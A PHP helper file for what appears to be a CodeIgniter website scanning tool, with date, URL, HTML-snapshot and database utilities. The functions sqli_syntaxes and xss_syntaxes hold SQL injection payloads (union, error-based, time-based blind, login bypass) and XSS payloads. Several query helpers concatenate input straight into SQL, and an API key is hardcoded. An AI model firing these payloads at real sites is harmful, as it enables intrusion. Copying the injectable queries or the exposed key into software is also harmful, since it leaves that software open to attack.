<?php

function get_time_difference($date) 
 {
    if(empty($date)) {
        return "No date provided";
    }
    $periods         = array("seconds", "minutes", "hours", "days", "weeks", "months", "years", "decades");
    $lengths         = array("60","60","24","7","4.35","12","10");
    $now             = strtotime("-0 minutes");
    $unix_date       = strtotime($date);

    if(empty($unix_date)) {   
        return "Bad date";
    }

    if($now > $unix_date) {   
        $difference     = $now - $unix_date;
        $tense = "ago";

    } else {
        $difference     = $unix_date - $now;
        $tense = "in";
    }

    for($j = 0; $difference >= $lengths[$j] && $j < count($lengths)-1; $j++) {
        $difference /= $lengths[$j];
    }

    $difference = round($difference);

    return (($now > $unix_date) ? ("$difference $periods[$j] {$tense}") : ("{$tense} $difference $periods[$j]"));
}
function get_time_difference_timestamp($date) 
 {
    if(empty($date)) {
        return "No date provided";
    }
    $periods         = array("seconds", "minutes", "hours", "days", "weeks", "months", "years", "decades");
    $lengths         = array("60","60","24","7","4.35","12","10");
    $now             = strtotime("-0 minutes");
    $unix_date       = ($date);

    if(empty($unix_date)) {   
        return "Bad date";
    }

    if($now > $unix_date) {   
        $difference     = $now - $unix_date;

    } else {
        $difference     = $unix_date - $now;
    }

    for($j = 0; $difference >= $lengths[$j] && $j < count($lengths)-1; $j++) {
        $difference /= $lengths[$j];
    }

    $difference = round($difference);

    return "$difference $periods[$j]";
}

function get_info_name($name, $selector = '*') { 
    $ci =& get_instance();
    $ci->db->select($selector); 
    $ci->db->from('users'); 
    $ci->db->where('name', $name);
    $query = $ci->db->get(); 
    $data=array();
    if($query->num_rows() > 0) return $data->result(); 
}

function get_info($selector, $table, $firstkey, $key) {
    $ci =& get_instance();
    $query = $ci->db->query("SELECT `".$selector."` FROM `".$table."` WHERE `".$firstkey."` = '".$key."' ");
    return (isset($query->result()[0]->$selector) ? $query->result()[0]->$selector: "unknown");
}

function get_cached_info($selector, $table, $firstkey, $key) {
    $ci =& get_instance();
    $ci->db->cache_on();
    $query = $ci->db->query("SELECT `".$selector."` FROM `".$table."` WHERE `".$firstkey."` = '".$key."' ");
    return (isset($query->result()[0]->$selector) ? $query->result()[0]->$selector: "unknown");
}

function countTable($table, $extra = "") {
    $ci =& get_instance();
    $query = $ci->db->query("SELECT * FROM `" . $table . "` " . $extra);
    return $query->num_rows();
}

function base64Encoded($data)
{
    if (preg_match('%^[a-zA-Z0-9/+]*={0,2}$%', $data)) {
       return TRUE;
    } else {
       return FALSE;
    }
};


function most_frequent_words($string, $stop_words = [], $limit = 5) { // stackoverflow
    $string = strtolower($string); // Make string lowercase

    $words = str_word_count($string, 1); // Returns an array containing all the words found inside the string
    $words = array_diff($words, $stop_words); // Remove black-list words from the array
    $words = array_count_values($words); // Count the number of occurrence

    arsort($words); // Sort based on count

    return array_slice($words, 0, $limit); // Limit the number of words and returns the word array
}

/* Sets a flash message then redirects */
function flash_redirect($type, $message, $where) {
    $CI =& get_instance();
    $CI->session->set_flashdata($type, $message);
    redirect($where);
}

function delete_all_between($beginning, $end, $string) {
  $beginningPos = strpos($string, $beginning);
  $endPos = strpos($string, $end);
  if (!$beginningPos || !$endPos) {
    return $string;
  }

  $textToDelete = substr($string, $beginningPos, ($endPos + strlen($end)) - $beginningPos);

  return str_replace($textToDelete, '', $string);
}

function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function sqli_syntaxes() {
    $syntax = array(
        'version'       => array(
                                    'normal'        => "' UNION ALL SELECT NULL,version()--",
                                    'error'         => "' AND extractvalue(rand(),concat(0x3a,version()))--",
                                    'double'        => "' AND(SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--",
                                    'inferential'   => "' AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL)--"
                                ),
        
        'login'         => array(
                                    'name' => "admin';--",
                                )
    );
    return $syntax;
}

function xss_syntaxes() {
    $syntax = array(
        '"></title><script>alert(1111)</script>',
        '<scrscriptipt>alert(1)</scrscriptipt>',
        '<h1>a</h1>',
        '<marquee><script>alert(/XSS/)</script></marquee>',
        'alert(String.fromCharCode(88,83,83));))">',
        '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
        '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>'
    );
    return $syntax;
}

function get_injection_type($numeric) {
    switch ($numeric) {
        case 1:
            return "normal";
        case 2:
            return "error";
        case 3:
            return "double";
        case 4:
            return "inferential";
        default:
            return "normal";
    }
}

function countable_html_tags() {
    $tags = array(
        'head',
        'body',
        'header',
        'footer',
        'nav',
        'title',
        'h1',
        'h2',
        'h3',
        'h4',
        'h5',
        'p',
        'span',
        'abbr',
        'code',
        'pre',
        'address',
        'button',
        'a',
        'div',
        'form',
        'input',
        'noscript',
        'option',
        'table',
        'thead',
        'tbody',
        'tr',
        'td',
        'style'
    );
    return $tags;
}

function html_minify($string) {
    return preg_replace('!\s+!', ' ', $string);
}

// stackoverflow
function rel2abs($rel, $base)
{
    /* return if already absolute URL */
    if (parse_url($rel, PHP_URL_SCHEME) != '' || substr($rel, 0, 2) == '//') return $rel;

    /* queries and anchors */
    if ($rel[0]=='#' || $rel[0]=='?') return $base.$rel;

    /* parse base URL and convert to local variables:
     $scheme, $host, $path */
     extract(parse_url($base));

    /* remove non-directory element from path */
    $path = preg_replace('#/[^/]*$#', '', $path);

    /* destroy path if relative url points to root */
    if ($rel[0] == '/') $path = '';

    /* dirty absolute URL */
    $abs = "$host$path/$rel";

    /* replace '//' or '/./' or '/foo/../' with '/' */
    $re = array('#(/\.?/)#', '#/(?!\.\.)[^/]+/\.\./#');
    for($n=1; $n>0; $abs=preg_replace($re, '/', $abs, -1, $n)) {}

    /* absolute URL is ready! */
    return $scheme.'://'.$abs;
}
//

function isAbsolutePath($file)
{
    return strspn($file, '/\\', 0, 1)
        || (strlen($file) > 3 && ctype_alpha($file[0])
            && substr($file, 1, 1) === ':'
            && strspn($file, '/\\', 2, 1)
        )
        || null !== parse_url($file, PHP_URL_SCHEME)
    ;
}

function get_data($url) {
	$ch = curl_init();
	$timeout = 5;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}

function set_absolute_paths($content, $url) {
    $styles = array();
    $scripts = array();
    
    // GET STYLES
    $dom = new DOMDocument;
    libxml_use_internal_errors(true);
    $dom->loadHTML($content);
    libxml_clear_errors();
    
    foreach ($dom->getElementsByTagName('link') as $node)
    {
        if(!isAbsolutePath($node->getAttribute("href")))
             $node->setAttribute('href', '//' . $url . '/' . $node->getAttribute("href"));
    }
    foreach ($dom->getElementsByTagName('script') as $node)
    {
        if(!isAbsolutePath($node->getAttribute("src")))
            $node->setAttribute('src', '//' . $url . '/' . $node->getAttribute("src"));
    }
    

    $content = $dom->saveHtml();
    return $content;
}

function clear_snapshot($content, $url) {
    $styles = array();
    $scripts = array();
    
    // GET STYLES
    $dom = new DOMDocument;
    libxml_use_internal_errors(true);
    $dom->loadHTML($content);
    libxml_clear_errors();
    
    foreach ($dom->getElementsByTagName('link') as $node)
    {
        array_push($styles, $node->getAttribute("href"));
    }
    
    // DELETE SCRIPTS
    for ($member_count = $dom->getElementsByTagName("script")->length; --$member_count >= 0; ) {
        $node = $dom->getElementsByTagName("script")->item($member_count);
        $node->parentNode->removeChild($node);
    }
    $content = $dom->saveHtml();
    
    // DELETE IFRAMES
    for ($member_count = $dom->getElementsByTagName("iframe")->length; --$member_count >= 0; ) {
        $node = $dom->getElementsByTagName("iframe")->item($member_count);
        $node->parentNode->removeChild($node);
    }
    $content = $dom->saveHtml();
    
    // DELETE HEADER
    $head_start = strrpos($content, "<head>");
    $head_stop = strrpos($content, "</head>");
    
     
    $content  = substr_replace($content, "", $head_start, $head_stop);

    $new_head = "<head>";
    
    foreach($styles as $style) {
        $parse = parse_url($url);
        $href = $parse['host'] . "/" . $style;
        $new_head .= "<link rel='stylesheet' href='" .  rel2abs($style, $url) . "'>";
    }
    
    $new_head .= "</head>";
    
    $snapshot = str_replace("</head>", $new_head, $content);
    return $snapshot;
}

function exists($refID, $table, $identificator = "`ID`") {
    $ci =& get_instance();
    $query = $ci->db->query("SELECT ID FROM `".$table."` WHERE $identificator = '".$refID."' LIMIT 1");
    return ($query->num_rows() ? true : false);
}

function get_ip_location($IP) {
    $APIKEY     = "189dadc9f0e4de1b77feaf12215cf5e9";
    $info       = json_decode(get_data("http://api.ipstack.com/$IP?access_key=$APIKEY&format=1"));
    return $info->city . ", " . $info->region_name . ", " . $info->country_name;
}

function format_size($number) {
    switch ($number) {
        case $number < 1024:
            $size = $number .' B'; break;
        case $number < 1048576:
            $size = round($number / 1024, 2) .' KiB'; break;
        case $number < 1073741824:
            $size = round($number / 1048576, 2) . ' MiB'; break;
        case $number < 1099511627776:
            $size = round($number / 1073741824, 2) . ' GiB'; break;
    }
    return $size;
}

function getRemoteFilesize($url, $formatSize = true, $useHead = true)
{
    if (false !== $useHead) {
        stream_context_set_default(array('http' => array('method' => 'HEAD')));
    }
    $head = array_change_key_case(get_headers($url, 1));
    // content-length of download (in bytes), read from Content-Length: field
    $clen = isset($head['content-length']) ? $head['content-length'] : 0;

    // cannot retrieve file size, return "-1"
    if (!$clen) {
        return 0;
    }

    if (!$formatSize) {
        return $clen; // return size in bytes
    }

    $size = $clen;
    switch ($clen) {
        case $clen < 1024:
            $size = $clen .' B'; break;
        case $clen < 1048576:
            $size = round($clen / 1024, 2) .' KiB'; break;
        case $clen < 1073741824:
            $size = round($clen / 1048576, 2) . ' MiB'; break;
        case $clen < 1099511627776:
            $size = round($clen / 1073741824, 2) . ' GiB'; break;
    }

    return $size; // return formatted size
}

/* God bless Stack */
function get_domain($url)
{
    $pieces = parse_url($url);
    $domain = isset($pieces['host']) ? $pieces['host'] : $pieces['path'];
    if (preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $domain, $regs)) {
        return $regs['domain'];
    }
    return false;
}
/**/

function get_http_code($url) 
{
    $headers = get_headers($url);
    return substr($headers[0], 9, 3);
}

function calculate_grade($size, $ext, $redirect_time) 
{
    switch($ext) {
        case 'css':
            if($size < 1024*100) {
                if($redirect_time == 0) {
                    return "OK";
                } else return "NOT OK (REDIRECT)";
            } else return "NOT OK (SIZE)";
            break;
        case 'js':
            if($size < 1024*150) {
                if($redirect_time == 0) {
                    return "OK";
                } else return "NOT OK (REDIRECT)";
            } else return "NOT OK (SIZE)";
            break;
        case 'html':
            if($size < 1024*50) {
                if($redirect_time == 0) {
                    return "OK";
                } else return "NOT OK (REDIRECT)";
            } else return "NOT OK (SIZE)";
            break;
        default:
            return "?";
            break;
    }
}

function random_hero() {
    $color = array("is-primary is-bold", "is-primary", "is-link is-bold", "is-link", "is-success is-bold", "is-success");
    return $color[mt_rand(0, count($color) - 1)];
}

?>